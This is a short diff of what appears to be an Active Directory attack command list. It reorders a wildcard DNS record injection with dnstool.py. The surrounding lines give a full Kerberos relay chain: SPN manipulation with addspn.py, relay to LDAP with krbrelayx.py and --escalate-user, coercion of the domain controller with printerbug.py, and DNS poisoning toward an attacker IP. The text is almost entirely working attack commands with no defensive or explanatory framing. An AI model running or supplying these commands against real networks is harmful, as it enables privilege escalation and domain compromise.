@@ -1,4 +1,4 @@
-dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action add --data "$(fzf-ip)" "$DC_HOST"
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action query "$DC_HOST"
 addspn.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" -t SV01 -s "HTTP/NIHIL-01.$DOMAIN" --additional "$DC_HOST"
 addspn.py -u "$DOMAIN"\\'SV01$' -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" -s "HOST/NIHIL-01.$DOMAIN" --additional "$DC_HOST"
 krbrelayx.py --krbpass "$PASSWORD" --krbsalt DOMAIN.LOCALSV01 -t ldap://"$DC_HOST" --escalate-user "$USER"
@@ -11,4 +11,4 @@ dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action remove -r "NIHIL-01.$DO
 dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action query -r "NIHIL-01.$DOMAIN" "$DC_HOST"
 dnstool.py -u "$DOMAIN"\\"$USER" -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" --action query -r "NIHIL-01.$DOMAIN" "$DC_HOST"
 printerbug.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" "$(fzf-ip)"
-dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action query "$DC_HOST"
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action add --data "$(fzf-ip)" "$DC_HOST"
